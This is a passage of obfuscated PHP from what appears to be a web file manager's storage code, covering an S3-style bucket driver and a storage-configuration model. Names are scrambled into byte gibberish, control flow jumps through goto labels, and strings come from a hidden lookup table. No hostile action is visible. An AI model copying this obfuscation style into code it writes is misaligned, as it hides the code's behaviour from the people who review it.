return in_array($AøĞó÷Œº¹, array($f¿ÜØÌ›é[193], $f¿ÜØÌ›é[194], $f¿ÜØÌ›é[195])) ? !0 : !1; } public function canWrite($a›’œ²’Õ¡) { $d‚ƒç‰»á½ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AÙöùÂÈ¶… = $this->client->getAccessControlPolicy($this->bucket, $a›’œ²’Õ¡); if (!$AÙöùÂÈ¶…) { return !1; } return in_array($AÙöùÂÈ¶…, array($d‚ƒç‰»á½[193], $d‚ƒç‰»á½[194])) ? !0 : !1; } public function getContent($Dß„Ê¬İ´¡) { return $this->client->getObject($this->bucket, $Dß„Ê¬İ´¡); } public function setContent($eïÙÍÕ²Ãš, $FÕ“ÆÅŠ = '', $b§ÒÅá¹½ = false) { goto BÌ‹„³Şê; BÌ‹„³Şê: $C™‹İÖÒ‚„ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eïÙÍÕ²Ãš = $b§ÒÅá¹½ ? trim($eïÙÍÕ²Ãš, $C™‹İÖÒ‚„[8]) . $C™‹İÖÒ‚„[8] : $eïÙÍÕ²Ãš; $cÃ¼è”Œ¥ = get_file_mime(get_path_ext($eïÙÍÕ²Ãš)); goto fĞ³ó±¾İ; C’·æ’Ğ¨®: $dô²¬ã¸ = $this->copyFile($eïÙÍÕ²Ãš, $eïÙÍÕ²Ãš, array($C™‹İÖÒ‚„[196] => $dô²¬ã¸[$C™‹İÖÒ‚„[197]])); return $dô²¬ã¸ ? !0 : !1; goto C ¶›ˆÂŠÊ; fĞ³ó±¾İ: $dô²¬ã¸ = $this->client->putObject($FÕ“ÆÅŠ, $this->bucket, $eïÙÍÕ²Ãš, $C™‹İÖÒ‚„[185], array(), $cÃ¼è”Œ¥); if (!$dô²¬ã¸) { return !1; } if ($b§ÒÅá¹½) { return !0; } goto C’·æ’Ğ¨®; C ¶›ˆÂŠÊ: } public function fileSubstr($C‡ÎéÇˆÕ, $aµÅÈÖ™÷, $aÙàßô…µŒ) { $aâÏĞÇ½ë¿ = $aµÅÈÖ™÷ + $aÙàßô…µŒ - 1; return $this->client->getObject($this->bucket, $C‡ÎéÇˆÕ, array($_SERVER[´Ù×Íå‘ÄõÛ][198] => "\x62\171\164\x65\x73\x3d{$aµÅÈÖ™÷}\x2d{$aâÏĞÇ½ë¿}")); } public function upload($d«Óã¼²ÂÖ, $Dë÷Èï¦È, $D‰ÉªÍëÊÌ = false, $d’†•äÄœò = REPEAT_REPLACE) { $fÎÈ‘Ù¹Ä =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B›î‘êÏ¥‰ = array($fÎÈ‘Ù¹Ä[196] => @md5_file($Dë÷Èï¦È)); $B›‰“î¥âÃ = array($fÎÈ‘Ù¹Ä[199] => get_file_mime(get_path_ext($d«Óã¼²ÂÖ))); if (IO::size($Dë÷Èï¦È) <= 1024 * 1024 * 200) { $bíÔ¡ìÃ˜† = $this->client->putObjectFile($Dë÷Èï¦È, $this->bucket, $d«Óã¼²ÂÖ, $fÎÈ‘Ù¹Ä[185], $B›î‘êÏ¥‰, $B›‰“î¥âÃ); return !empty($bíÔ¡ìÃ˜†) ? $this->getPathOuter($d«Óã¼²ÂÖ) : !1; } $cèšçİÏƒŠ = $this->client->multiUploadObject($Dë÷Èï¦È, $this->bucket, trim($d«Óã¼²ÂÖ, $fÎÈ‘Ù¹Ä[8]), $B›î‘êÏ¥‰, $B›‰“î¥âÃ); return $cèšçİÏƒŠ ? $this->getPathOuter($d«Óã¼²ÂÖ) : !1; } public function download($dçá‰­Öˆæ, $d¡ôâ®©) { if (!@is_dir($this->pathFather($d¡ôâ®©)) && !IO::mkdir($this->pathFather($d¡ôâ®©))) { return !1; } $F”æ§¶ïÍÇ = $this->client->getObject($this->bucket, $dçá‰­Öˆæ, array(), $d¡ôâ®©); return $F”æ§¶ïÍÇ !== !1 ? $d¡ôâ®© : !1; } public function link($F»†øêİ–Ú, $E³ÒÉÈƒáØ = array()) { $Bİíî…èÕª =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($this->signVer == $Bİíî…èÕª[200]) { return $this->client->getAuthenticatedURL($this->bucket, $F»†øêİ–Ú, 3600 * 12, $E³ÒÉÈƒáØ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($F»†øêİ–Ú, $Bİíî…èÕª[8]), 3600 * 12, $this->region, array(), !0, $E³ÒÉÈƒáØ); } public function fileOut($DÏ³¯’Àùò, $dãßî’”™ = false, $EÄ˜ÒÅÔ‚ = false, $c›ñ¤¯ã—ä = '') { goto AéÙÒ¼Ú¨À; AéÙÒ¼Ú¨À: $c—›»†ç =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($this->isFileOutServer()) { return $this->fileOutServer($DÏ³¯’Àùò, $dãßî’”™, $EÄ˜ÒÅÔ‚, $c›ñ¤¯ã—ä); } if (!$EÄ˜ÒÅÔ‚) { $EÄ˜ÒÅÔ‚ = $this->pathThis($DÏ³¯’Àùò); } goto a¦•´÷Æ„Ñ; a¦•´÷Æ„Ñ: $dÁŠ¼…Á‰í = get_file_mime(get_path_ext($EÄ˜ÒÅÔ‚)); if ($dÁŠ¼…Á‰í == $c—›»†ç[201]) { return parent::fileOut($DÏ³¯’Àùò, $dãßî’”™, $EÄ˜ÒÅÔ‚, $c›ñ¤¯ã—ä); } $dãßî’”™ = $dãßî’”™ ? $c—›»†ç[202] : $c—›»†ç[203]; goto d˜Œß±£ƒ; d˜Œß±£ƒ: $a±‡òËŠø† = array($c—›»†ç[204] => $dãßî’”™ . $c—›»†ç[205] . rawurlencode($EÄ˜ÒÅÔ‚), $c—›»†ç[206] => $dÁŠ¼…Á‰í); $CùÒª‡«õ‚ = $this->link($DÏ³¯’Àùò, $a±‡òËŠø†); $this->fileOutLink($CùÒª‡«õ‚); goto c¶ß´ ¿ ; c¶ß´ ¿ : } public function fileOutServer($aÀ¢ƒ¬ó†Š, $Fî›ˆ‘ = false, $BÉºŠÍœà¨ = false, $aßÙ“¼£Ó„ = '') { parent::fileOut($aÀ¢ƒ¬ó†Š, $Fî›ˆ‘, $BÉºŠÍœà¨, $aßÙ“¼£Ó„); } public function fileOutImageServer($BÀš´óŞŞÏ, $bì¿Åó‘ = 250) { parent::fileOutImage($BÀš´óŞŞÏ, $bì¿Åó‘); } public function hashMd5($Cô¡‘†§¹, $fš‡ĞÀ‘ê» = '') { $cºÇÇğêÍà =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C‚‰•È÷„ = $this->objectMeta($Cô¡‘†§¹); if (!$C‚‰•È÷„) { return !1; } $fš‡ĞÀ‘ê» = $fš‡ĞÀ‘ê» ? $fš‡ĞÀ‘ê» : _get($C‚‰•È÷„, $cºÇÇğêÍà[207]); $fš‡ĞÀ‘ê» = $fš‡ĞÀ‘ê» ? $fš‡ĞÀ‘ê» : _get($C‚‰•È÷„, $cºÇÇğêÍà[197], $cºÇÇğêÍà[33]); return $fš‡ĞÀ‘ê»; } public function uploadFormData($FÊ§Ûõš×, $f•·•È½Å‘ = 3600) { $f‘„¿®ì =& $_SERVER[´Ù×Íå‘ÄõÛ]; $A¥Ş…ƒØÖ = $this->pathFather($FÊ§Ûõš×); $bõ¸‘ì¡˜ˆ = $this->client->getHttpUploadPostParams($this->bucket, $A¥Ş…ƒØÖ, $f‘„¿®ì[185], $f•·•È½Å‘); return array_merge((array) $bõ¸‘ì¡˜ˆ, array($f‘„¿®ì[169] => $this->getHost())); } public function multiUploadFormData($dâØÙ¾÷ÍÊ, $CÀî¨Š¥â™ = 3600) { $aÒ¦îŞÁ¥Ü =& $_SERVER[´Ù×Íå‘ÄõÛ]; $e¬Ñê¸í = gmdate($aÒ¦îŞÁ¥Ü[208]); $E’ÌÓ¿Äè = array(); $d¬ÓÌ›»¿ = $this->client->getUploadId($this->bucket, $dâØÙ¾÷ÍÊ, $E’ÌÓ¿Äè); if (!$d¬ÓÌ›»¿) { return !1; } return array($aÒ¦îŞÁ¥Ü[209] => $d¬ÓÌ›»¿, $aÒ¦îŞÁ¥Ü[169] => $this->getHost() . $aÒ¦îŞÁ¥Ü[8] . $this->pathEncode($dâØÙ¾÷ÍÊ), $aÒ¦îŞÁ¥Ü[210] => $e¬Ñê¸í, $aÒ¦îŞÁ¥Ü[89] => $dâØÙ¾÷ÍÊ); } public function multiUploadAuthData($EØÓèà²ªÜ, $EŒÏ¬çïà = array()) { goto CÃÀóˆÌİ•; C„ğÎù÷ì: $FÄÀµÅçİ = array($dìÅŠ±Ø¢[212], $dìÅŠ±Ø¢[33], $dìÅŠ±Ø¢[116], $dìÅŠ±Ø¢[33], "\x78\55\x61\x6d\172\55\x64\141\x74\x65\x3a{$A´†ó…Ğµï}", $dìÅŠ±Ø¢[8] . $this->bucket . $dìÅŠ±Ø¢[8] . $this->pathEncode($B±‚ò‰ß—¹) . $e¥âœİòƒÎ); if (strpos($e¥âœİòƒÎ, $dìÅŠ±Ø¢[213]) === 0) { $FÄÀµÅçİ[0] = $dìÅŠ±Ø¢[214]; } if (isset($EŒÏ¬çïà[$dìÅŠ±Ø¢[215]]) && $EŒÏ¬çïà[$dìÅŠ±Ø¢[215]] == $dìÅŠ±Ø¢[216]) { $FÄÀµÅçİ[0] = $dìÅŠ±Ø¢[216]; } goto AËÏÉÀÙ¾›; EÒ†Ï×÷: if (strpos($e¥âœİòƒÎ, $dìÅŠ±Ø¢[213]) === 0) { return array($dìÅŠ±Ø¢[220] => $cƒŸ×ÜŸƒà, $dìÅŠ±Ø¢[210] => $A´†ó…Ğµï); } return $cƒŸ×ÜŸƒà; goto Dä‚¶‡¡ò; AËÏÉÀÙ¾›: $C—³µ·‰±¤ = implode($dìÅŠ±Ø¢[217], $FÄÀµÅçİ); $D‚ÊÊåËùİ = base64_encode(hash_hmac($dìÅŠ±Ø¢[218], $C—³µ·‰±¤, $this->secret, !0)); $cƒŸ×ÜŸƒà = $dìÅŠ±Ø¢[219] . $this->accessKey . $dìÅŠ±Ø¢[4] . $D‚ÊÊåËùİ; goto EÒ†Ï×÷; e¨ÅÈ¼Ğ—‡: $B±‚ò‰ß—¹ = $EŒÏ¬çïà[$dìÅŠ±Ø¢[89]]; unset($EŒÏ¬çïà[$dìÅŠ±Ø¢[89]]); if (isset($EŒÏ¬çïà[$dìÅŠ±Ø¢[211]])) { $EŒÏ¬çïà[$dìÅŠ±Ø¢[210]] = $A´†ó…Ğµï; return $this->listUploadParts($B±‚ò‰ß—¹, $EŒÏ¬çïà); } goto C„ğÎù÷ì; CÃÀóˆÌİ•: $dìÅŠ±Ø¢ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $A´†ó…Ğµï = isset($EŒÏ¬çïà[$dìÅŠ±Ø¢[210]]) ? $EŒÏ¬çïà[$dìÅŠ±Ø¢[210]] : gmdate($dìÅŠ±Ø¢[208]); $e¥âœİòƒÎ = isset($EŒÏ¬çïà[$dìÅŠ±Ø¢[160]]) ? $EŒÏ¬çïà[$dìÅŠ±Ø¢[160]] : $dìÅŠ±Ø¢[33]; goto e¨ÅÈ¼Ğ—‡; Dä‚¶‡¡ò: } public function listUploadParts($d¤±óä½Ü’, $f¤Û·ï»Û = array()) { goto Dé³Î¹ßµÔ; dñ§¼¡÷¬•: if (!$c²ÓÈÕÇ„É) { return !1; } unset($f¤Û·ï»Û[$a„Ãïñìäğ[211]], $f¤Û·ï»Û[$a„Ãïñìäğ[215]]); $f¤Û·ï»Û[$a„Ãïñìäğ[89]] = $d¤±óä½Ü’; goto D¢çí†ÑÜÎ; D¢çí†ÑÜÎ: $a÷¦ˆˆËÙÂ = $this->multiUploadAuthData($d¤±óä½Ü’, $f¤Û·ï»Û); if (empty($a÷¦ˆˆËÙÂ)) { return !1; } return array($a„Ãïñìäğ[220] => $a÷¦ˆˆËÙÂ, $a„Ãïñìäğ[210] => $f¤Û·ï»Û[$a„Ãïñìäğ[210]], $a„Ãïñìäğ[222] => $c²ÓÈÕÇ„É); goto a¾·ŠÁ; Dé³Î¹ßµÔ: $a„Ãïñìäğ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $e­¢¹Úöë = str_replace($a„Ãïñìäğ[221], $a„Ãïñìäğ[33], $f¤Û·ï»Û[$a„Ãïñìäğ[160]]); $c²ÓÈÕÇ„É = $this->client->listParts($this->bucket, $d¤±óä½Ü’, $e­¢¹Úöë); goto dñ§¼¡÷¬•; a¾·ŠÁ: } public function getHost() { return parent::getHost() . $_SERVER[´Ù×Íå‘ÄõÛ][8] . $this->bucket; } public function size($a‘ßÇï©Ö¨) { $cù×éÀ»¦Œ = $this->objectMeta($a‘ßÇï©Ö¨); return $cù×éÀ»¦Œ ? $cù×éÀ»¦Œ[$_SERVER[´Ù×Íå‘ÄõÛ][77]] : 0; } public function info($aÛ™Å‘Ù™·) { if ($this->isFolder($aÛ™Å‘Ù™·)) { return $this->folderInfo($aÛ™Å‘Ù™·); } else { if ($this->isFile($aÛ™Å‘Ù™·)) { return $this->fileInfo($aÛ™Å‘Ù™·); } } return !1; } public function exist($Dà¤ö÷·’˜) { return $this->isFile($Dà¤ö÷·’˜) || $this->isFolder($Dà¤ö÷·’˜); } public function isFile($cå‘¯ŒåÃÄ) { return !$this->isFolder($cå‘¯ŒåÃÄ) && $this->objectMeta($cå‘¯ŒåÃÄ); } public function isFolder($D‹ê£•È¸) { return $this->cacheMethod($_SERVER[´Ù×Íå‘ÄõÛ][223], $D‹ê£•È¸); } protected function objectMeta($c¸å±±®‹´) { return $this->cacheMethod($_SERVER[´Ù×Íå‘ÄõÛ][224], $c¸å±±®‹´); } protected function _objectMeta($DàÖº›ğã) { $C²•íÃ¿ë =& $_SERVER[´Ù×Íå‘ÄõÛ]; $DàÖº›ğã = rtrim($DàÖº›ğã, $C²•íÃ¿ë[8]); try { $cò»ìµ¦ğ³ = $this->client->getObjectInfo($this->bucket, $DàÖº›ğã); if (!isset($cò»ìµ¦ğ³[$C²•íÃ¿ë[207]]) && isset($cò»ìµ¦ğ³[$C²•íÃ¿ë[225]])) { $cò»ìµ¦ğ³[$C²•íÃ¿ë[207]] = $cò»ìµ¦ğ³[$C²•íÃ¿ë[225]]; } } catch (Exception $eÏ‘”¡‘˜) { $cò»ìµ¦ğ³ = !1; } if (!$cò»ìµ¦ğ³) { } return $cò»ìµ¦ğ³; } protected function _isFolder($dë•œô·) { goto BÌìÒ§¢Æ; F«£ïˆ¥É¡: $Eëìá”Ò­Î = $this->client->getBucket($this->bucket, $dë•œô·, null, 1); if (empty($Eëìá”Ò­Î)) { return !1; } $Eëìá”Ò­Î = array_values($Eëìá”Ò­Î); goto aˆÁ Ì›ĞÜ; BÌìÒ§¢Æ: $eÙÂª³ˆƒå =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dë•œô· = rtrim($dë•œô·, $eÙÂª³ˆƒå[8]); if ($dë•œô· == $eÙÂª³ˆƒå[33] || $dë•œô· == $eÙÂª³ˆƒå[8]) { return !0; } goto F«£ïˆ¥É¡; aˆÁ Ì›ĞÜ: if (substr($Eëìá”Ò­Î[0][$eÙÂª³ˆƒå[28]], -1) == $eÙÂª³ˆƒå[8]) { return !0; } if (get_path_this($Eëìá”Ò­Î[0][$eÙÂª³ˆƒå[28]]) == get_path_this($dë•œô·)) { return !1; } return !0; goto dÊ…ÏÜ½‡¡; dÊ…ÏÜ½‡¡: } } define($_SERVER[´Ù×Íå‘ÄõÛ][226], 1); goto bõ¾’‹–±ó; Aî‰³¿¡¦Î: class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\56\x73\164\157\x72\x61\x67\x65\114\x69\163\x74"; public $field = array("\156\x61\155\145", "\163\151\172\x65\x4d\x61\170", "\x73\x79\163\164\145\x6d", "\144\x65\x66\x61\165\154\164", "\144\162\151\166\145\x72", "\x63\157\x6e\146\x69\147"); public function listData($a„‹ëÔ„Ïº = false, $D‹æŠ¢¸°© = "\155\x6f\x64\x69\x66\171\x54\x69\155\145", $cÊšÃ¿ä = false) { goto A×ÌŒ‚ò½Š; E‚Øôİè»İ: foreach ($c¸£¹¡äØ£ as $AïÜ‡âÂÌ => $b´¶ªÃ·Ş‰) { unset($c¸£¹¡äØ£[$AïÜ‡âÂÌ][$fìî¯˜Ö¥ƒ[6]]); $c¸£¹¡äØ£[$AïÜ‡âÂÌ][$fìî¯˜Ö¥ƒ[2098]] = 0; } $CœâªÄÑÒí = array_to_keyvalue($c¸£¹¡äØ£, $fìî¯˜Ö¥ƒ[33], $fìî¯˜Ö¥ƒ[367]); $this->_listAppendSize($c¸£¹¡äØ£, $CœâªÄÑÒí); goto e•«ÖÂÒ¨; e•«ÖÂÒ¨: return $c¸£¹¡äØ£; goto aŒñ½×É; A×ÌŒ‚ò½Š: $fìî¯˜Ö¥ƒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $c¸£¹¡äØ£ = parent::listData($a„‹ëÔ„Ïº, $D‹æŠ¢¸°©, $cÊšÃ¿ä); if ($a„‹ëÔ„Ïº) { return $c¸£¹¡äØ£; } goto E‚Øôİè»İ; aŒñ½×É: } public function _listAppendSize(&$Bºïº‰¡Šµ, $CìÏœŞÄô) { $AÈ›¨œ‰øš =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$CìÏœŞÄô) { return; } $B‘àĞ³¾ = $AÈ›¨œ‰øš[2390] . implode($AÈ›¨œ‰øš[47], $CìÏœŞÄô) . $AÈ›¨œ‰øš[2391]; $eÇßÇ¿‚’÷ = Model($AÈ›¨œ‰øš[719])->query($B‘àĞ³¾); $eÇßÇ¿‚’÷ = array_to_keyvalue($eÇßÇ¿‚’÷, $AÈ›¨œ‰øš[367], $AÈ›¨œ‰øš[77]); foreach ($Bºïº‰¡Šµ as $bè‚½Ñøîè => $fÖˆóÒ¤ñ) { $Bºïº‰¡Šµ[$bè‚½Ñøîè][$AÈ›¨œ‰øš[2098]] = isset($eÇßÇ¿‚’÷[$fÖˆóÒ¤ñ[$AÈ›¨œ‰øš[367]]]) ? $eÇßÇ¿‚’÷[$fÖˆóÒ¤ñ[$AÈ›¨œ‰øš[367]]] : 0; } } public function getConfig($D©‚Äš¾´ù) { $c¹ï—Ê¨«Ø = parent::listData($D©‚Äš¾´ù); return json_decode($c¹ï—Ê¨«Ø[$_SERVER[´Ù×Íå‘ÄõÛ][6]], !0); } public function update($a“áÚÇŠáö, $EÖî»Ÿ¨˜˜) { goto aßÒ‡İö‚á; bÆæÚåÖ×: $eÇ™â¸¨î÷ = parent::update($a“áÚÇŠáö, $EÖî»Ÿ¨˜˜); if ($eÇ™â¸¨î÷ && $EÖî»Ÿ¨˜˜[$C‰øÊ§¥Æ²[34]]) { foreach ($eùöÇ’‹Ã as $DŞ“÷ÌÙ±) { if ($DŞ“÷ÌÙ±[$C‰øÊ§¥Æ²[34]] && $DŞ“÷ÌÙ±[$C‰øÊ§¥Æ²[367]] != $a“áÚÇŠáö) { parent::update($DŞ“÷ÌÙ±[$C‰øÊ§¥Æ²[367]], array($C‰øÊ§¥Æ²[34] => 0)); } } } return $eÇ™â¸¨î÷; goto CøŒäØµ¼—; aßÒ‡İö‚á: $C‰øÊ§¥Æ² =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Aë¹Ğç„‡È = $EÖî»Ÿ¨˜˜[$C‰øÊ§¥Æ²[28]]; $eùöÇ’‹Ã = array_to_keyvalue(parent::listData(), $C‰øÊ§¥Æ²[28]); goto EË Ş´–‘³; EË Ş´–‘³: if (isset($eùöÇ’‹Ã[$Aë¹Ğç„‡È]) && $eùöÇ’‹Ã[$Aë¹Ğç„‡È][$C‰øÊ§¥Æ²[367]] != $a“áÚÇŠáö) { return !1; } if (isset($EÖî»Ÿ¨˜˜[$C‰øÊ§¥Æ²[2392]]) && $EÖî»Ÿ¨˜˜[$C‰øÊ§¥Æ²[2392]] == $C‰øÊ§¥Æ²[83]) { $this->checkConfig($EÖî»Ÿ¨˜˜); } unset($EÖî»Ÿ¨˜˜[$C‰øÊ§¥Æ²[2392]]); goto bÆæÚåÖ×; CøŒäØµ¼—: } public function add($AŒ‘·¡Ì×) { goto b°“Ãêé; FìŒå‚›’: $this->checkConfig($AŒ‘·¡Ì×); $DĞØ¦‘¬¼Œ = parent::insert($AŒ‘·¡Ì×); if ($DĞØ¦‘¬¼Œ && $AŒ‘·¡Ì×[$E·ÆÌ¬„ƒ[34]]) { foreach ($F È¬‚°›ï as $B…á‚¯Û) { if ($B…á‚¯Û[$E·ÆÌ¬„ƒ[34]]) { parent::update($B…á‚¯Û[$E·ÆÌ¬„ƒ[367]], array($E·ÆÌ¬„ƒ[34] => 0)); } } } goto BßÀá¾Éõ»; BßÀá¾Éõ»: return $DĞØ¦‘¬¼Œ; goto A¾°˜Ÿ…¹; b°“Ãêé: $E·ÆÌ¬„ƒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F È¬‚°›ï = array_to_keyvalue(parent::listData(), $E·ÆÌ¬„ƒ[28]); if (isset($F È¬‚°›ï[$AŒ‘·¡Ì×[$E·ÆÌ¬„ƒ[28]]])) { return !1; } goto FìŒå‚›’; A¾°˜Ÿ…¹: } public function checkConfig(&$b×İãøñÃ) { goto bš‰ó‚¼ˆª; a—‘òë—ğ: return !0; goto fŠÎÛÑ³š; FÛ‘Èç»¹Ğ: foreach ($F±¬’æ¡å© as $e¶ï—‹œ => $AÖ¶¹ŠÓ¯‰) { $F±¬’æ¡å©[$e¶ï—‹œ] = trim($AÖ¶¹ŠÓ¯‰); } $F±¬’æ¡å©[$A ÷Í—‰í[2393]] = rand_string(6); $D“ÓÆÀ…Æ = $this->driverType($E·ˆà¢ˆ·Ë); goto E‘Ä¦ƒÀÊ; báä³ëùõÊ: $F±¬’æ¡å©[$A ÷Í—‰í[1028]] = $dùÏ¯öÜß“; $b×İãøñÃ[$A ÷Í—‰í[6]] = json_encode($F±¬’æ¡å©); $b×İãøñÃ[$A ÷Í—‰í[90]] = $D“ÓÆÀ…Æ; goto a—‘òë—ğ; Eõ”ğİğÜ±: $dùÏ¯öÜß“ = rtrim($F±¬’æ¡å©[$A ÷Í—‰í[1028]], $A ÷Í—‰í[8]) . $A ÷Í—‰í[8]; $BµËë™”Å = $AÔÈ‹‘›ô->getPath($dùÏ¯öÜß“ . $A ÷Í—‰í[1993]); if (!$AÔÈ‹‘›ô->mkfile($BµËë™”Å)) { show_json(LNG($A ÷Í—‰í[2394]), !1); } goto báä³ëùõÊ; bš‰ó‚¼ˆª: $A ÷Í—‰í =& $_SERVER[´Ù×Íå‘ÄõÛ]; $E·ˆà¢ˆ·Ë = strtolower($b×İãøñÃ[$A ÷Í—‰í[90]]); $F±¬’æ¡å© = json_decode($b×İãøñÃ[$A ÷Í—‰í[6]], !0); goto FÛ‘Èç»¹Ğ; E‘Ä¦ƒÀÊ: $bñ®Ôåòö = $A ÷Í—‰í[71] . $D“ÓÆÀ…Æ; $AÔÈ‹‘›ô = new $bñ®Ôåòö($F±¬’æ¡å©); if (in_array($E·ˆà¢ˆ·Ë, $AÔÈ‹‘›ô->objectDriver)) { if (!$AÔÈ‹‘›ô->isBucketCors() && !$AÔÈ‹‘›ô->setBucketCors()) { $bö‹ïŒéìê = LNG($A ÷Í—‰í[2394]); $bö‹ïŒéìê .= $A ÷Í—‰í[2395] . LNG($A ÷Í—‰í[2396]); show_json($bö‹ïŒéìê, !1); } } goto Eõ”ğİğÜ±; fŠÎÛÑ³š: } private function driverType($f¡ ±õ³‹™) { $EŠ­‹ß…é§ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bî¯ÑÔ• = array($EŠ­‹ß…é§[102] => $EŠ­‹ß…é§[2397], $EŠ­‹ß…é§[58] => $EŠ­‹ß…é§[2398], $EŠ­‹ß…é§[64] => $EŠ­‹ß…é§[2399]); if (isset($bî¯ÑÔ•[$f¡ ±õ³‹™])) { return $bî¯ÑÔ•[$f¡ ±õ³‹™]; } return strtoupper($f¡ ±õ³‹™); } public function driverListSystem() { $F—à‘Ç© =& $_SERVER[´Ù×Íå‘ÄõÛ]; $A†Ù²†âëĞ = parent::listData(); $c¡Á ÒÖ = array(); foreach ($A†Ù²†âëĞ as $f‰­ŸÚ‹Í) { unset($f‰­ŸÚ‹Í[$F—à‘Ç©[187]], $f‰­ŸÚ‹Í[$F—à‘Ç©[107]]); $f‰­ŸÚ‹Í[$F—à‘Ç©[6]] = json_decode($f‰­ŸÚ‹Í[$F—à‘Ç©[6]], !0); $c¡Á ÒÖ[] = $f‰­ŸÚ‹Í; } return $c¡Á ÒÖ; } public function defaultDriver() { $a¦½ğ›Îô“ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C™áÙí±¹ = parent::listData(); $Dîæ“†À¼Ì = array_filter_by_field($C™áÙí±¹, $a¦½ğ›Îô“[34], 1); $Dîæ“†À¼Ì = $Dîæ“†À¼Ì[0]; if ($Dîæ“†À¼Ì) { $Dîæ“†À¼Ì[$a¦½ğ›Îô“[6]] = json_decode($Dîæ“†À¼Ì[$a¦½ğ›Îô“[6]], !0); } return $Dîæ“†À¼Ì; } public function driverInfo($aªà¥¶¡İî) { $D‹Ú¿¦­³ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $DÎà°êœ¡ = array_to_keyvalue(parent::listData(), $D‹Ú¿¦­³[367]); if (!isset($DÎà°êœ¡[$aªà¥¶¡İî])) { return !1; } $D÷›ß°œ©Ô = $DÎà°êœ¡[$aªà¥¶¡İî]; $D÷›ß°œ©Ô[$D‹Ú¿¦­³[6]] = json_decode($D÷›ß°œ©Ô[$D‹Ú¿¦­³[6]], !0); return $D÷›ß°œ©Ô; } public function remove($cÚêŠ¼©§­) { $this->removeShareItems($cÚêŠ¼©§­); return parent::remove($cÚêŠ¼©§­); } public function removeWithFile($e•¬ÅÓ„ã) { goto Eî›õ•ŞÒ; A¥ç¥Ç‰ï: $fµ¤»Šù¡ = "\x7b\x69\157\72{$aÄ÷¶¹ù‘«}\175\57"; $E›ŞÄÃã¾ = !0; $CŒÕ±¾á‘‰ = array(); goto Cš¦³•Ô; Eî›õ•ŞÒ: $B³çâœäè‹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d¼éÍİäâÜ = array($B³çâœäè‹[744] => $e•¬ÅÓ„ã); $Fñ‘È„ÖÃÇ = Model($B³çâœäè‹[422])->where($d¼éÍİäâÜ)->count(); goto D¨ß£Ë®…Š; D¨ß£Ë®…Š: $D·¦‘Âœ‚Ş = Model($B³çâœäè‹[422])->where($d¼éÍİäâÜ)->sum($B³çâœäè‹[77]); $AêøÈÖ»î = $B³çâœäè‹[2400] . $e•¬ÅÓ„ã; $f÷ñøÈÏ‹Ÿ = new TaskFileTransfer($AêøÈÖ»î, $B³çâœäè‹[2401], $Fñ‘È„ÖÃÇ, LNG($B³çâœäè‹[2402]) . "\50{$e•¬ÅÓ„ã}\x29"); goto d¬»«óß; Cš¦³•Ô: $e‰œÑ†á· = Model($B³çâœäè‹[167])->where($d¼éÍİäâÜ)->field($B³çâœäè‹[2403])->select(); foreach ($e‰œÑ†á· as $AŠİ…ÔáĞ) { goto eÄ÷¦ÄÒÏ; eÄ÷¦ÄÒÏ: $DİöÔÑæšÍ = $AŠİ…ÔáĞ[$B³çâœäè‹[75]]; $C¦ÖÔĞÅ™’ = $fµ¤»Šù¡ . str_replace("\173\151\x6f\x3a{$e•¬ÅÓ„ã}\175\x2f", $B³çâœäè‹[33], $DİöÔÑæšÍ); if (!IO::exist($DİöÔÑæšÍ)) { $CŒÕ±¾á‘‰[] = $AŠİ…ÔáĞ[$B³çâœäè‹[419]]; $f÷ñøÈÏ‹Ÿ->updateFileEnd($AŠİ…ÔáĞ[$B³çâœäè‹[28]], $AŠİ…ÔáĞ[$B³çâœäè‹[77]]); continue; } goto f”„„‰åæ; f”„„‰åæ: if (IO::exist($C¦ÖÔĞÅ™’)) { $f÷ñøÈÏ‹Ÿ->updateFileEnd($AŠİ…ÔáĞ[$B³çâœäè‹[28]], $AŠİ…ÔáĞ[$B³çâœäè‹[77]]); continue; } if (!IO::move($DİöÔÑæšÍ, get_path_father($C¦ÖÔĞÅ™’))) { $E›ŞÄÃã¾ = !1; break; } $d¼éÍİäâÜ = array($B³çâœäè‹[419] => $AŠİ…ÔáĞ[$B³çâœäè‹[419]]); goto Dé§›Èë‰•; Dé§›Èë‰•: $Cºç„ê·‘› = array($B³çâœäè‹[744] => $aÄ÷¶¹ù‘«, $B³çâœäè‹[75] => $C¦ÖÔĞÅ™’); Model($B³çâœäè‹[167])->where($d¼éÍİäâÜ)->save($Cºç„ê·‘›); goto AÌó é˜¬; AÌó é˜¬: } $this->removeByFileID($CŒÕ±¾á‘‰); goto eí„ˆå¤íÑ; eí„ˆå¤íÑ: if (!$E›ŞÄÃã¾) { $f÷ñøÈÏ‹Ÿ->stop($AêøÈÖ»î); return !1; } $f÷ñøÈÏ‹Ÿ->end(); $this->remove($e•¬ÅÓ„ã); goto e‹Ï”¤ğã; d¬»«óß: $f÷ñøÈÏ‹Ÿ->task[$B³çâœäè‹[699]] = (double) $D·¦‘Âœ‚Ş; $A¬³âñï¦ = KodIO::defaultDriver(); $aÄ÷¶¹ù‘« = $A¬³âñï¦[$B³çâœäè‹[367]]; goto A¥ç¥Ç‰ï; e‹Ï”¤ğã: } public function progress($dƒ½Ş¶éäÛ) { return Task::get($_SERVER[´Ù×Íå‘ÄõÛ][2400] . $dƒ½Ş¶éäÛ); } private function removeByFileID($Aİ©†µˆºï = array()) { goto d¯–’‚Ÿæà; b‘¡ÓéÕ¶: foreach ($A´ì–›Ó‚Æ as $e©ÅÀƒ÷öØ) { Model($Dİ‹òÀšù[382])->removeNow($e©ÅÀƒ÷öØ, !1); } goto f›¯Áõ­•·; d¯–’‚Ÿæà: 